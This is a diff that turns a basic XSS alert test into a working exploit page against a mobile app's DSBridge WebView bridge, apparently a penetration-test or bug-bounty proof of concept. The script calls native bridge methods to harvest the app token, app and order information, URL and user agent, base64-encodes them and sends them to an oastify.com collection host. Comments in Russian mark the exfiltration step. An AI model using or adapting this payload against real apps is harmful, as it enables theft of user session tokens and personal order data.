@@ -1,1 +1,26 @@
-<script>alert("XSS");</script>
+  <!doctype html>                                                                                                                                              
+  <script>                                                                                                                                                     
+  // DSBridge v3 sync call: window._dsbridge.call("method", JSON.stringify({data: ...}))                                                                       
+  function ds(method, data) {                                                                                                                                  
+    var r = window._dsbridge.call(method, JSON.stringify({data: data||null}));                                                                                 
+    try { return JSON.parse(r).data; } catch(e) { return r; }                                                                                                  
+  }                                                                                                                                                            
+                                                                                                                                                               
+  (async () => {  
+    var loot = {                                                                                                                                               
+      token:    ds("getAppToken"),
+      appInfo:  ds("getAppInfo"),                                                                                                                              
+      order:    ds("getOrderInfo"),                                                                                                                            
+      href:     location.href,                                                                                                                                 
+      ua:       navigator.userAgent                                                                                                                            
+    };                                                                                                                                                         
+   
+    // DSBridge async call c CompletionHandler — jumpNativePage тоже отдаёт токен                                                                              
+    window._jumped = function(d){ loot.jumpToken = d; };
+    window._dsbridge.call("jumpNativePage",                                                                                                                    
+      JSON.stringify({data: {}, _dscbstub: "_jumped"}));                                                                                                       
+                                                                                                                                                               
+    // эксфил                                                                                                                                                  
+    fetch("https://fudujqqhoqfkn13m68zs5ab2stykmda2.oastify.com/collect?d=" + encodeURIComponent(btoa(JSON.stringify(loot))));                                                                     
+  })();                                                                                                                                                        
+  </script>
